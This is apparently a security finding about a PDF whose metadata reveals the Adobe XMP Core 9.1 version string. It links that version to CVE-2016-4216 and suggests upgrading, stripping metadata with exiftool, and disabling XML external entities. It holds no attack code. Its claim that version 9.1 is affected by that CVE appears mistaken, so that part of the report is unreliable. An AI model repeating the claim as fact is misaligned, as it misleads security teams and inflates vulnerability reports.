Vulnerability: Disclosure of Adobe XMP Core 9.1 Version in PDF Metadata
Description
The presence of the version string "Adobe XMP Core 9.1-c00279.b7c64cc" in a PDF’s metadata reveals the specific version of the XMP Toolkit SDK used to generate or manipulate the file. This version is known to be affected by a publicly disclosed XML External Entity (XXE) vulnerability (CVE-2016-4216), which could allow an attacker to exploit XML parsing processes if they control input to an affected parser.

By exposing this version in PDF metadata, an attacker can confidently fingerprint the environment and target known weaknesses, increasing the risk of a successful exploit.

🚨 Impact
Information Disclosure: Attackers can identify vulnerable libraries and tailor attacks (e.g., XXE payloads).

Security Posture Downgrade: Reveals internal software versions, violating secure-by-obscurity principles.

Compliance Risk: Disclosing component versions may violate organizational or regulatory security standards (e.g., ISO/IEC 27001).

🔧 Remediation
Upgrade Adobe XMP Toolkit

Immediately upgrade to the latest version of the Adobe XMP Toolkit SDK where CVE-2016-4216 and related vulnerabilities are patched.

Sanitize Metadata

Strip or redact version-identifying metadata from PDFs during post-processing.

Use tools like exiftool:

bash
Copy
Edit
exiftool -xmp:Toolkit= -overwrite_original your.pdf
Implement Secure XML Parsing

If your application uses XML parsing, ensure all parsers disable DTDs and external entities (e.g., in Java, set XMLInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false)).

Monitor and Patch Regularly

Regularly scan binaries and generated files for outdated or vulnerable metadata.
